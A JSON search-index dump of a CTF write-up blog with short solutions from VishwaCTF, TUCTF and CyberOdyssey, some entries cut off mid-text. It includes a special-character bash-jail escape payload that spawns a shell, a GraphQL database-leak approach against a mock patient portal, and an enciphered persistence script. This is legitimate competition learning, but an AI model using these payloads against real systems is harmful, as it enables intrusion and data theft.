[{"categories":["Writeups"],"content":"VishwaCTF","date":"2025-03-05","objectID":"/vishwactf/","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"I aced the first wave which was fun. ","date":"2025-03-05","objectID":"/vishwactf/:0:0","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"QuadRant - Steganography ","date":"2025-03-05","objectID":"/vishwactf/:1:0","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Explanation I used https://merri.cx/qrazybox/ to fix the QR code, simple as that. ","date":"2025-03-05","objectID":"/vishwactf/:1:1","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Spilled Paint Water - Steganography ","date":"2025-03-05","objectID":"/vishwactf/:2:0","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Explanation You can edit svg files : \u003csvg id=\"eEnmxFAjcr61\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" viewBox=\"0 0 300 300\" shape-rendering=\"geometricPrecision\" text-rendering=\"geometricPrecision\" project-id=\"325d788ad90b4729a3b39f752dd4d05d\" export-id=\"a48c1b27901f4ee7a8d074ff5e6709e9\" cached=\"false\"\u003e \u003cclipPath id=\"clipArea\"\u003e \u003crect x=\"1000\" y=\"1000\" width=\"200\" height=\"200\"/\u003e \u003c/clipPath\u003e \u003cg clip-path=\"url(#clipArea)\"\u003e \u003cstyle\u003e svg { background-color:#a2b5e0 ; } \u003c/style\u003e \u003cline x1=\"7.865168\" y1=\"-4.868914\" x2=\"-7.865168\" y2=\"4.868914\" transform=\"translate(23.782772 74.531835)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"-7.865168\" y1=\"-4.494382\" x2=\"7.865168\" y2=\"4.494382\" transform=\"translate(23.782772 83.895131)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"7.865168\" y1=\"-6.367041\" x2=\"-7.865168\" y2=\"6.367042\" transform=\"translate(23.782772 94.756555)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"0\" y1=\"-12.546817\" x2=\"0\" y2=\"12.546817\" transform=\"translate(48.876404 82.209738)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"-10.486891\" y1=\"0\" x2=\"10.486892\" y2=\"0\" transform=\"translate(47.378277 69.662921)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"0\" y1=\"-10.11236\" x2=\"0\" y2=\"10.11236\" transform=\"translate(57.865169 84.644195)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"-8.988764\" y1=\"0\" x2=\"8.988764\" y2=\"0\" transform=\"translate(66.853933 74.531835)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"0\" y1=\"-4.681648\" x2=\"0\" y2=\"4.681648\" transform=\"translate(75.842697 79.213483)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"-8.988764\" y1=\"0\" x2=\"8.988764\" y2=\"0\" transform=\"translate(66.853933 84.644195)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"-6.741573\" y1=\"-5.430712\" x2=\"6.741573\" y2=\"5.430712\" transform=\"translate(64.606742 89.325843)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"0\" y1=\"-12.546817\" x2=\"0\" y2=\"12.546817\" transform=\"translate(81.835206 82.209738)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"-7.490636\" y1=\"0\" x2=\"7.490637\" y2=\"0\" transform=\"translate(89.325843 69.662921)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"0\" y1=\"-14.794008\" x2=\"0\" y2=\"14.794008\" transform=\"translate(96.81648 79.962547)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"-7.490637\" y1=\"0\" x2=\"7.490637\" y2=\"0\" transform=\"translate(89.325843 94.756555)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"-0.374532\" y1=\"-14.794008\" x2=\"0.374532\" y2=\"14.794008\" transform=\"translate(108.426966 79.962547)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"4.494382\" y1=\"-6.273409\" x2=\"-4.494382\" y2=\"6.273409\" transform=\"translate(113.29588 75.93633)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"-5.243446\" y1=\"-6.273409\" x2=\"5.243446\" y2=\"6.273409\" transform=\"translate(118.539326 88.483147)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"1.123595\" y1=\"-12.546817\" x2=\"-1.123595\" y2=\"12.546817\" transform=\"translate(130.898877 82.209738)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"-10.112359\" y1=\"0\" x2=\"10.112359\" y2=\"0\" transform=\"translate(139.887641 65.168539)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"-3.932585\" y1=\"0.702247\" x2=\"3.932584\" y2=\"-0.702247\" transform=\"translate(135.955057 75.234083)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"-6.928839\" y1=\"0\" x2=\"6.928838\" y2=\"0\" transform=\"translate(137.827716 89.325843)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"0.374532\" y1=\"-11.985019\" x2=\"-0.374532\" y2=\"11.985019\" transform=\"translate(118.164794 127.340824)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"-6.741573\" y1=\"-9.737828\" x2=\"6.741573\" y2=\"9.737828\" transform=\"translate(125.280899 125.093633)\" fill=\"none\" stroke=\"#a2b5e4\" stroke-width=\"3\"/\u003e \u003cline x1=\"-0.561798\" y1=\"-13.857678\" x2=\"0.561797\" y2=\"13.857678\" transform=\"tra","date":"2025-03-05","objectID":"/vishwactf/:2:1","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Sanity Check - Misc ","date":"2025-03-05","objectID":"/vishwactf/:3:0","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Explanation zoom out and you’ll see this : ","date":"2025-03-05","objectID":"/vishwactf/:3:1","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Hungry Friends - Reverse ","date":"2025-03-05","objectID":"/vishwactf/:4:0","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Explanation I used binaryninja to modify the game while it’s being run, added a breakpoint for when the score is being compared to the win value : then I simply modified eax. ","date":"2025-03-05","objectID":"/vishwactf/:4:1","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Aria of the Lost Code - Crypto ","date":"2025-03-05","objectID":"/vishwactf/:5:0","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Explanation Very simple one again, the symbols are from the Hymnos Alphabet ","date":"2025-03-05","objectID":"/vishwactf/:5:1","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Chitty-Chat - Forensics ","date":"2025-03-05","objectID":"/vishwactf/:6:0","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Explanation Opened chitty-chat.pcapng with a text editor, looked for strings, found the flag. ","date":"2025-03-05","objectID":"/vishwactf/:6:1","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Safe Box - Reverse ","date":"2025-03-05","objectID":"/vishwactf/:7:0","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Explanation Melonloader + UnityExplorer, as soon as you open the game you can just hide the safe and only show the flag, easy. ","date":"2025-03-05","objectID":"/vishwactf/:7:1","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Stadium - OSINT ","date":"2025-03-05","objectID":"/vishwactf/:8:0","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Explanation Simple Google reverse image search ","date":"2025-03-05","objectID":"/vishwactf/:8:1","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Rhythmic Cipher - Crypto ","date":"2025-03-05","objectID":"/vishwactf/:9:0","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Explanation Dancing men cipher. ","date":"2025-03-05","objectID":"/vishwactf/:9:1","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Follow for Clues - OSINT ","date":"2025-03-05","objectID":"/vishwactf/:10:0","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Explanation Instagram page has an edited post containing the flag ","date":"2025-03-05","objectID":"/vishwactf/:10:1","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Persist - Forensics ","date":"2025-03-05","objectID":"/vishwactf/:11:0","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Explanation This one was very hard for someone who rarely plays forensics…Using Registry Explorer I was able to find a hint by looking at the Run folder : Decoding the base64 : function Decrypt-Vigenere { param ( [string]$CipherText, [string]$Key ) $keyLength = $Key.Length $keyIndex = 0 $plainText = \"\" foreach ($char in $CipherText.ToCharArray()) { if ($char -match '[A-Za-z]') { $isUpper = ($char -cmatch '[A-Z]') $base = if ($isUpper) { [int][char]'A' } else { [int][char]'a' } $keyChar = $Key[$keyIndex % $keyLength] $keyShift = ([int][char]$keyChar - [int][char]'A') % 26 $shiftedChar = [char]((([int][char]$char - $base - $keyShift + 26) % 26) + $base) $plainText += $shiftedChar $keyIndex++ } else { $plainText += $char } } return $plainText } function Decrypt-Base64-Vigenere { param ( [string]$EncryptedString, [string]$Key ) $vigenereCipherText = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncryptedString)) $plainText = Decrypt-Vigenere -CipherText $vigenereCipherText -Key $Key return $plainText } $passKey = Read-Host \"Enter the passkey for Vigenère cipher\" $encryptedString = \"\u003cTEXT_HERE\u003e\" $decryptedText = Decrypt-Base64-Vigenere -EncryptedString $encryptedString -Key $passKey Write-Output \"Decrypted Text: $decryptedText\" So the output is in base64 and at first I didn’t know Registry Explorer has a base64 search feature, so I kept manually looking until I found out I could just do ctrl-f and search for base64 values : It was in the “ET” folder. Combining the base64 values gave me this weird code : $urbk = \"C:\\NwfouakIrbd\\AQZJ\\akabtn.mae\" $cczaws = Rjjb-Sarm -Giwh $nfkp -SarmKgse Jjrn lf ($cczaws) { Qyrzw-Ppttmvs $nfkp } hlqj { dsgip \"H:\\GzrgpfdLdty\\Tlbsur\" Nedrkc-BvjUeozvaw -Upn ybwpq://grqgu.atd/es-cmskmqt/qmrlrw.ccv -WxtDncm $sarm $wtdg = \"TNJPZAAYW{j3o1ed_ne_z3j_p0uji}\" Awapy-Gzrccxj $xdtf } This took me a while to decrypt and ironically as soon as I realized the key was hidden in the challenge description “FRIDAY”, Deepseek managed to decrypt the flag by pure AI math or whatever. ","date":"2025-03-05","objectID":"/vishwactf/:11:1","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Chaos - Crypto ","date":"2025-03-05","objectID":"/vishwactf/:12:0","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Explanation Simply reverse the operations : decode the base85 and xor with (i % 256) import base64 def xor_decrypt(encrypted_b85): try: transformed = base64.b85decode(encrypted_b85) except: return None original = bytearray(transformed) for i in range(len(original)): original[i] ^= (i % 256) return bytes(original) encrypted_messages = [] with open('output.txt', 'r') as f: for line in f: line = line.strip() if line: encrypted_messages.append(line) for msg in encrypted_messages: decrypted = xor_decrypt(msg) if decrypted: try: decoded = decrypted.decode('utf-8') print(decoded) except UnicodeDecodeError: continue ","date":"2025-03-05","objectID":"/vishwactf/:12:1","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"The Lecture Code - OSINT ","date":"2025-03-05","objectID":"/vishwactf/:13:0","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"Explanation the author’s github repo contains a python script for deciphering something, since it’s an OSINT challenge I had to take a look at social media accounts. Under a linkedin post she commented : $nf7xtbr8vf, this was the passphrase. ","date":"2025-03-05","objectID":"/vishwactf/:13:1","tags":["VishwaCTF",2025],"title":"VishwaCTF Writeup","uri":"/vishwactf/"},{"categories":["Writeups"],"content":"TUCTF 2025","date":"2025-01-29","objectID":"/tuctf/","tags":["TUCTF",2025],"title":"TUCTF - (Some) Writeup","uri":"/tuctf/"},{"categories":["Writeups"],"content":"This CTF is very beginner friendly, some challenges were very interesting. ","date":"2025-01-29","objectID":"/tuctf/:0:0","tags":["TUCTF",2025],"title":"TUCTF - (Some) Writeup","uri":"/tuctf/"},{"categories":["Writeups"],"content":"Med Graph - Web ","date":"2025-01-29","objectID":"/tuctf/:1:0","tags":["TUCTF",2025],"title":"TUCTF - (Some) Writeup","uri":"/tuctf/"},{"categories":["Writeups"],"content":"Description My startup is launching the next big patient portal, using the hottest new tech! Check it out with our guest account: Demo:TUCTF. We’re still in beta, but it’s so secure we already have users! Note: This challenge requires no bruteforcing or intense scanning of the application. Explanation: This one is based around known hashes, but to get to that I had to leak the whole database. ","date":"2025-01-29","objectID":"/tuctf/:1:1","tags":["TUCTF",2025],"title":"TUCTF - (Some) Writeup","uri":"/tuctf/"},{"categories":["Writeups"],"content":"Explanation At first I thought it was a simple JWT challenge but I couldn’t change the token and log in as a doctor. Then I realized that the backend was exposed : So all I had to do was inject my own javascript, I first needed to know what the tables were, then I had to simply look for where the passwords are stored { \"__schema\": { \"directives\": [ { \"args\": [ { \"defaultValue\": null, \"description\": \"Included when true.\", \"name\": \"if\", \"type\": { \"kind\": \"NON_NULL\", \"name\": null, \"ofType\": { \"kind\": \"SCALAR\", \"name\": \"Boolean\", \"ofType\": null } } } ], \"description\": \"Directs the executor to include this field or fragment only when the `if` argument is true.\", \"locations\": [ \"FIELD\", \"FRAGMENT_SPREAD\", \"INLINE_FRAGMENT\" ], \"name\": \"include\" }, { \"args\": [ { \"defaultValue\": null, \"description\": \"Skipped when true.\", \"name\": \"if\", \"type\": { \"kind\": \"NON_NULL\", \"name\": null, \"ofType\": { \"kind\": \"SCALAR\", \"name\": \"Boolean\", \"ofType\": null } } } ], \"description\": \"Directs the executor to skip this field or fragment when the `if` argument is true.\", \"locations\": [ \"FIELD\", \"FRAGMENT_SPREAD\", \"INLINE_FRAGMENT\" ], \"name\": \"skip\" }, { \"args\": [ { \"defaultValue\": \"\\\"No longer supported\\\"\", \"description\": \"Explains why this element was deprecated, usually also including a suggestion for how to access supported similar data. Formatted using the Markdown syntax, as specified by [CommonMark](https://commonmark.org/).\", \"name\": \"reason\", \"type\": { \"kind\": \"SCALAR\", \"name\": \"String\", \"ofType\": null } } ], \"description\": \"Marks an element of a GraphQL schema as no longer supported.\", \"locations\": [ \"FIELD_DEFINITION\", \"ARGUMENT_DEFINITION\", \"INPUT_FIELD_DEFINITION\", \"ENUM_VALUE\" ], \"name\": \"deprecated\" }, { \"args\": [ { \"defaultValue\": null, \"description\": \"The URL that specifies the behavior of this scalar.\", \"name\": \"url\", \"type\": { \"kind\": \"NON_NULL\", \"name\": null, \"ofType\": { \"kind\": \"SCALAR\", \"name\": \"String\", \"ofType\": null } } } ], \"description\": \"Exposes a URL that specifies the behavior of this scalar.\", \"locations\": [ \"SCALAR\" ], \"name\": \"specifiedBy\" } ], \"mutationType\": null, \"queryType\": { \"name\": \"Query\" }, \"subscriptionType\": null, \"types\": [ { \"description\": null, \"enumValues\": null, \"fields\": [ { \"args\": [ { \"defaultValue\": null, \"description\": null, \"name\": \"id\", \"type\": { \"kind\": \"NON_NULL\", \"name\": null, \"ofType\": { \"kind\": \"SCALAR\", \"name\": \"Int\", \"ofType\": null } } } ], \"deprecationReason\": null, \"description\": null, \"isDeprecated\": false, \"name\": \"patient\", \"type\": { \"kind\": \"OBJECT\", \"name\": \"PatientType\", \"ofType\": null } }, { \"args\": [], \"deprecationReason\": null, \"description\": null, \"isDeprecated\": false, \"name\": \"userData\", \"type\": { \"kind\": \"OBJECT\", \"name\": \"PatientType\", \"ofType\": null } }, { \"args\": [ { \"defaultValue\": null, \"description\": null, \"name\": \"id\", \"type\": { \"kind\": \"NON_NULL\", \"name\": null, \"ofType\": { \"kind\": \"SCALAR\", \"name\": \"Int\", \"ofType\": null } } } ], \"deprecationReason\": null, \"description\": null, \"isDeprecated\": false, \"name\": \"doctor\", \"type\": { \"kind\": \"OBJECT\", \"name\": \"DoctorType\", \"ofType\": null } }, { \"args\": [], \"deprecationReason\": null, \"description\": null, \"isDeprecated\": false, \"name\": \"allPatients\", \"type\": { \"kind\": \"LIST\", \"name\": null, \"ofType\": { \"kind\": \"OBJECT\", \"name\": \"PatientType\", \"ofType\": null } } }, { \"args\": [], \"deprecationReason\": null, \"description\": null, \"isDeprecated\": false, \"name\": \"allDoctors\", \"type\": { \"kind\": \"LIST\", \"name\": null, \"ofType\": { \"kind\": \"OBJECT\", \"name\": \"DoctorType\", \"ofType\": null } } }, { \"args\": [ { \"defaultValue\": null, \"description\": null, \"name\": \"patientId\", \"type\": { \"kind\": \"NON_NULL\", \"name\": null, \"ofType\": { \"kind\": \"SCALAR\", \"name\": \"Int\", \"ofType\": null } } } ], \"deprecationReason\": null, \"description\": null, \"isDeprecated\": false, \"name\": \"appointmentsByPatient\", \"type\": { \"kind\": \"LIST\", \"name\": null, \"ofType\": { \"kind\": \"OBJECT\", \"name\": \"AppointmentType\", \"ofType\": null } } }, { \"args\": [ { \"defaultValue\": null, \"description","date":"2025-01-29","objectID":"/tuctf/:1:2","tags":["TUCTF",2025],"title":"TUCTF - (Some) Writeup","uri":"/tuctf/"},{"categories":["Writeups"],"content":"Shopping Time - Web ","date":"2025-01-29","objectID":"/tuctf/:2:0","tags":["TUCTF",2025],"title":"TUCTF - (Some) Writeup","uri":"/tuctf/"},{"categories":["Writeups"],"content":"Description I finally got my online shop up and running, check it out and see what you like! ","date":"2025-01-29","objectID":"/tuctf/:2:1","tags":["TUCTF",2025],"title":"TUCTF - (Some) Writeup","uri":"/tuctf/"},{"categories":["Writeups"],"content":"Explanation Just like Med Graph, this one also revolves around hashes, this time it’s an md5 that was cut to 6 characters, so technically we can bruteforce it, I wasted a lot of time trying to look for leaked MD5’s online but the correct way is to bruteforce a similar hash : import hashlib import random import string def generate_random_string(length=10): return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length)) def find_md5_with_prefix(prefix): while True: random_string = generate_random_string() md5_hash = hashlib.md5(random_string.encode()).hexdigest() if md5_hash.startswith(prefix): print(f\"Found MD5 hash: {md5_hash}\") print(f\"Input string: {random_string}\") break # Specify the prefix you're looking for prefix = \"c58360\" find_md5_with_prefix(prefix) ","date":"2025-01-29","objectID":"/tuctf/:2:2","tags":["TUCTF",2025],"title":"TUCTF - (Some) Writeup","uri":"/tuctf/"},{"categories":["Writeups"],"content":"Custom Image Generator - Rev ","date":"2025-01-29","objectID":"/tuctf/:3:0","tags":["TUCTF",2025],"title":"TUCTF - (Some) Writeup","uri":"/tuctf/"},{"categories":["Writeups"],"content":"Description It’s still a work in progress, but I made my own file format! It is pretty efficient I think, but there may be improvements. ","date":"2025-01-29","objectID":"/tuctf/:3:1","tags":["TUCTF",2025],"title":"TUCTF - (Some) Writeup","uri":"/tuctf/"},{"categories":["Writeups"],"content":"Explanation Right so obviously the code given was missing a display function and was also broken so I fixed it : from PIL import Image import numpy as np import crc8 def main(): inp = input(\"\"\" Welcome to the TU Image Program It can convert images to TIMGs It will also display TIMGs [1] Convert Image to TIMG [2] Display TIMG Enter your choice: \"\"\") match inp: case \"1\": conv() case \"2\": display() ''' [ASCII Art] ''' case _: print(\"Invalid option selected.\") return 0 def conv(): file = input(\"Enter the path to the image you want converted to a TIMG file:\\n\") out = input(\"Enter the path you'd like to write the TIMG to:\\n\") try: img = Image.open(file) img = img.convert(\"RGB\") # Ensure image is in RGB mode except IOError: print(\"Cannot open image. Please check the file path and format.\") return w, h = img.size write = bytearray(b'TIMG\\x00\\x01\\x00\\x02') # Append width and height with big-endian byte order write += w.to_bytes(4, byteorder='big') write += h.to_bytes(4, byteorder='big') write += b'\\x52\\x55\\x42\\x59' # 'RUBY' # Process Red, Green, and Blue channels for channel, label in zip(range(3), ['R', 'G', 'B']): for i in range(h): dat = bytearray(b'DAT' + label.encode()) for j in range(w): pixel = img.getpixel((j, i)) dat.append(pixel[channel]) checksum = getCheck(dat) dat += checksum write += dat write += b'DATE' try: with open(out, \"wb\") as f: f.write(write) print(\"TIMG file created successfully.\") except IOError: print(\"Cannot write to the output file. Please check the path and permissions.\") return 0 def getCheck(datr): \"\"\" Calculate the CRC8 checksum for the given data. Parameters: - datr (bytearray): Data over which to calculate the checksum. Returns: - bytes: A single byte representing the checksum. \"\"\" # Exclude the 'DATX' header (first 4 bytes) if checksum is over the pixel data only data_to_checksum = datr[4:] # Calculate CRC8 checksum crc = crc8.crc8() crc.update(data_to_checksum) checksum = crc.digest() # Returns a single byte return checksum # Returns bytes object of length 1 def display(): \"\"\" Display an image from a TIMG file by parsing its contents and reconstructing the image. \"\"\" import sys file = input(\"Enter the path to the TIMG file you want to display:\\n\") try: with open(file, \"rb\") as f: # Read and verify header header = f.read(4) if header != b'TIMG': print(\"Invalid TIMG file: Missing 'TIMG' header.\") return width_bytes = f.read(4) height_bytes = f.read(4) if len(width_bytes) \u003c4 or len(height_bytes) \u003c4: print(\"Invalid TIMG file: Missing width/height.\") return width = int.from_bytes(width_bytes, byteorder='big') height = int.from_bytes(height_bytes, byteorder='big') ruby = f.read(4) if ruby != b'RUBY': print(\"Invalid TIMG file: Missing 'RUBY' identifier.\") return print(f\"Image Size: {width}x{height}\") # Initialize empty arrays for R, G, B R = np.zeros((height, width), dtype=np.uint8) G = np.zeros((height, width), dtype=np.uint8) B = np.zeros((height, width), dtype=np.uint8) # Read R blocks for i in range(height): block_header = f.read(4) if block_header != b'DATR': print(f\"Invalid TIMG file: Expected 'DATR' block at R channel row {i+1}. Found {block_header}\") return data = f.read(width) if len(data) \u003c width: print(f\"Invalid TIMG file: Not enough data for R channel row {i+1}.\") return checksum = f.read(1) if len(checksum) \u003c1: print(f\"Invalid TIMG file: Missing checksum for R channel row {i+1}.\") return # Verify checksum calculated_checksum = getCheck(bytearray(b'DATR') + bytearray(data)) debug = f\"Checksum: {checksum}, Calculated: {calculated_checksum}\" # Append debug to a file with open(\"debug1.txt\", \"a\") as t: t.write(debug + \"\\n\") #if checksum != calculated_checksum: # print(f\"Checksum mismatch for R channel row {i+1}.\") # return R[i] = np.frombuffer(data, dtype=np.uint8) # Read G blocks for i in range(height): block_header = f.read(4) if block_header != b'DATG': print(f\"Invalid TIMG file: Expected 'DATG' block at G channel row {i+1}. Found {block_header}\") return data = f.read(width) if len(data) \u003c width: ","date":"2025-01-29","objectID":"/tuctf/:3:2","tags":["TUCTF",2025],"title":"TUCTF - (Some) Writeup","uri":"/tuctf/"},{"categories":["Writeups"],"content":"CyberOdyssey 2024","date":"2024-12-23","objectID":"/cyberodysseyfinals/","tags":["CyberOdyssey",2024],"title":"Cyber Odyssey 2024 Finals - Full Writeup","uri":"/cyberodysseyfinals/"},{"categories":["Writeups"],"content":"Intro Dolphin supremacy 🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬 ","date":"2024-12-23","objectID":"/cyberodysseyfinals/:1:0","tags":["CyberOdyssey",2024],"title":"Cyber Odyssey 2024 Finals - Full Writeup","uri":"/cyberodysseyfinals/"},{"categories":["Writeups"],"content":"BashCage - Misc ","date":"2024-12-23","objectID":"/cyberodysseyfinals/:2:0","tags":["CyberOdyssey",2024],"title":"Cyber Odyssey 2024 Finals - Full Writeup","uri":"/cyberodysseyfinals/"},{"categories":["Writeups"],"content":"Description I heard you can execute bash commands using only special characters. Show me what you got! ","date":"2024-12-23","objectID":"/cyberodysseyfinals/:2:1","tags":["CyberOdyssey",2024],"title":"Cyber Odyssey 2024 Finals - Full Writeup","uri":"/cyberodysseyfinals/"},{"categories":["Writeups"],"content":"Explanation Inspired by https://medium.com/@philomath213/securinets-ctf-quals-2019-special-revenge-6c923d5b900b and https://gist.github.com/dimasma0305/c3d5d3cac71c8240a491a3010f2372b8 I pretty much had to write “sh” (which would open a shell) knowing that : {% raw %} \"0\": \"${#}\", \"1\": \"${##}\", \"2\": \"$((${##}\u003c\u003c$((${##}))))\", \"3\": \"$((${##}\u003c\u003c$((${##}))^${##}))\", \"4\": \"$((${##}\u003c\u003c$((${##}))\u003c\u003c$((${##}))))\", \"5\": \"$((${##}\u003c\u003c$((${##}))\u003c\u003c$((${##}))^${##}))\", \"6\": \"$(($((${##}\u003c\u003c$((${##}))^${##}))\u003c\u003c${##}))\", \"7\": \"$(($((${##}\u003c\u003c$((${##}))^${##}))\u003c\u003c${##}^${##}))\", \"8\": \"$((${##}\u003c\u003c$((${##}))\u003c\u003c$((${##}))\u003c\u003c$((${##}))))\", \"9\": \"$((${##}\u003c\u003c$((${##}))\u003c\u003c$((${##}))\u003c\u003c$((${##}))^${##}))\", We can call a shell by doing : $'\\163'$'\\150' By trial and error I ended up with this “payload” where I believe I convert both 163 and 150 to binary : $'\\\\$(($((${##}\u003c\u003c${##}))#${##}${#}${##}${#}${#}${#}${##}${##}))'$'\\\\$(($((${##}\u003c\u003c$((${##}))))#${##}${#}${#}${##}${#}${##}${##}${#}))' {% endraw %} ","date":"2024-12-23","objectID":"/cyberodysseyfinals/:2:2","tags":["CyberOdyssey",2024],"title":"Cyber Odyssey 2024 Finals - Full Writeup","uri":"/cyberodysseyfinals/"},{"categories":["Writeups"],"content":"tskhinat - Rev ","date":"2024-12-23","objectID":"/cyberodysseyfinals/:3:0","tags":["CyberOdyssey",2024],"title":"Cyber Odyssey 2024 Finals - Full Writeup","uri":"/cyberodysseyfinals/"},{"categories":["Writeups"],"content":"Description ","date":"2024-12-23","objectID":"/cyberodysseyfinals/:3:1","tags":["CyberOdyssey",2024],"title":"Cyber Odyssey 2024 Finals - Full Writeup","uri":"/cyberodysseyfinals/"},{"categories":["Writeups"],"content":"Explanation Main was easy to understand Had to take each function, turn it into an equation and use z3 solver to solve this system : from z3 import * def solve_bitwise_constraints(): # Create a bitvector variable 'a' of 32 bits a = BitVec('a', 32) # Define constraints constraints = [ # a \u0026 0x19 = 25 a \u0026 0x19 == 25, # (a \u0026 0x4900) \u003e\u003e 8 = 73 Extract(15, 0, a \u0026 0x4900) \u003e\u003e 8 == 73, # a1 \u003c\u003c 8 \u003e\u003e 24 = 35 # Note: a1 is derived from a (a \u003c\u003c 8 \u003e\u003e 24) == 35, # HIBYTE(a1) = 4 # High byte of a1, which is equivalent to (a1 \u003e\u003e 24) Extract(31, 24, a) == 4 ] # Create a solver and add constraints solver = Solver() for constraint in constraints: solver.add(constraint) # Check if constraints are satisfiable if solver.check() == sat: # Get the model (solution) model = solver.model() print(\"Solution found:\") print(f\"a = {model[a]}\") print(f\"a (hex) = 0x{model[a].as_long():08x}\") # Verify constraints a_val = model[a].as_long() print(\"\\nVerification:\") print(f\"a \u0026 0x19 = {a_val \u0026 0x19}\") print(f\"(a \u0026 0x4900) \u003e\u003e 8 = {(a_val \u0026 0x4900) \u003e\u003e 8}\") print(f\"a1 \u003c\u003c 8 \u003e\u003e 24 = {(a_val \u003c\u003c 8) \u003e\u003e 24}\") print(f\"HIBYTE(a1) = {(a_val \u003e\u003e 24) \u0026 0xFF}\") else: print(\"No solution exists.\") # Run the solver solve_bitwise_constraints() ","date":"2024-12-23","objectID":"/cyberodysseyfinals/:3:2","tags":["CyberOdyssey",2024],"title":"Cyber Odyssey 2024 Finals - Full Writeup","uri":"/cyberodysseyfinals/"},{"categories":["Writeups"],"content":"ChasSamBly - Rev ","date":"2024-12-23","objectID":"/cyberodysseyfinals/:4:0","tags":["CyberOdyssey",2024],"title":"Cyber 